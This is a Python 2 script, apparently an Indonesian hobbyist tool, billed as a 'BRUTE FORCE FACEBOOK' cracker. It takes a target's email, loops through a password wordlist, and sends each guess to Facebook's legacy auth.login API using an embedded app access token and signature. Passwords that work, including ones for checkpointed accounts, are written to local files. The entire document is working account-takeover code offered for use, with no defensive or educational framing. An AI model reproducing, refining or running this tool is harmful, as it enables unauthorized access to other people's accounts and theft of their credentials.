#!/usr/bin/python
# coding=utf-8
# Source : Python2 Gerak"

#Import module
import os,sys,json,time
from multiprocessing.pool import ThreadPool
try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
from requests.exceptions import ConnectionError
from mechanize import Browser

#-Animasi-#
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
		
def brute():
	try:
		os.system("reset")
		print"\n"
		jalan("\033[1;91mBRUTE FORCE FACEBOOK ")
		jalan("AUTHOR :\033[1;91m Rifal Guntara ")
		jalan("\033[1;91mWELCOME TO MY PROJECT ENJOY..")
		print 42*"\033[1;97m═"
		email = raw_input("\033[1;97m[\033[1;91m/\033[1;97m] Target :\033[1;97m ")
		total = open("list.txt","r")
		total = total.readlines()
		print 42*"\033[1;97m═"
		print"\033[1;91m[/\033[1;97m] Target :\033[1;97m "+email
		print "[\033[1;91m/\033[1;97m] Total\033[1;91m "+str(len(total))+" \033[1;97mPassword"
		sandi = open("list.txt","r")
		for pw in sandi:
			try:
				pw = pw.replace("\n","")
				sys.stdout.write("\r[\033[1;91m/\033[1;97m] Crack : \033[1;97m"+pw)
				sys.stdout.flush()
				data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(email)+"&locale=en_US&password="+(pw)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
				mpsh = json.loads(data.text)
				if 'access_token' in mpsh:
					dapat = open("cekpot.txt", "w")
					dapat.write(email+" | "+pw+"\n")
					dapat.close()
					print "\n[\033[1;91m/\033[1;97m]\033[1;92m Found"
					print 42*"\033[1;97m═"
					print("[\033[1;91m/\033[1;97m] Username :\033[1;97m "+email)
					print("[\033[1;91m/\033[1;97m] Password :\033[1;97m "+pw)
					print 42*"\033[1;97m═"
					print("\033[1;00mPlease Enter To Countinue and Ctrl C for exit.....")
					os.system("read")
					os.system("xdg-open https://m.facebook.com/login.php")
					os.system("exit")
				elif 'www.facebook.com' in mpsh["error_msg"]:
					ceks = open("cekpoint.txt", "w")
					ceks.write(email+" | "+pw+"\n")
					ceks.close()
					print "\n[\033[1;91m/\033[1;97m]\033[1;92m Found"
					print 42*"\033[1;97m═"
					print "\033[1;91m[!] Account Checkpoint"
					print("\033[1;97m[\033[1;91m/\033[1;97m] Username \033[1;91m:\033[1;97m "+email)
					print("\033[1;97m[\033[1;91m/\033[1;97m] Password \033[1;91m:\033[1;97m "+pw)
					print 42*"\033[1;97m═"
					print("\033[1;00mPlease Enter To Countinue and Ctrl C for exit.....")
					os.system("read")
					os.system("xdg-open https://m.facebook.com/login.php")
					os.system("exit")
			except requests.exceptions.ConnectionError:
				print"\033[1;91m[!] Connection Error"
				time.sleep(1)
	except IOError:
		print ("\033[1;93m kimak...")
		
		
		
		
		
if __name__=='__main__':
	brute()	